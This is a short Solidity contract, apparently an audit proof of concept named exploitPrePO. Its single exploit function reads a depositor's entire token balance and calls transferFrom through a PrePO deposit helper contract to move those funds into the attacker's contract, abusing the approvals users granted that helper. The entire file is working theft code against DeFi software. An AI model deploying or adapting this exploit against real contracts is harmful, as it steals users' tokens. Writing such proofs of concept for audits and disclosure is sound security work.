// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../node_modules/@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract exploitPrePO {


    function exploit(address depositHelper, address token, address depositor) external {

        IERC20 tokenContract = IERC20(token);

        uint256 balance = tokenContract.balanceOf(depositor);

        if(balance > 0){
           (bool success, ) = depositHelper.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", depositor, address(this), balance  ));
           require(success, "transfer failed");
        }
    }
}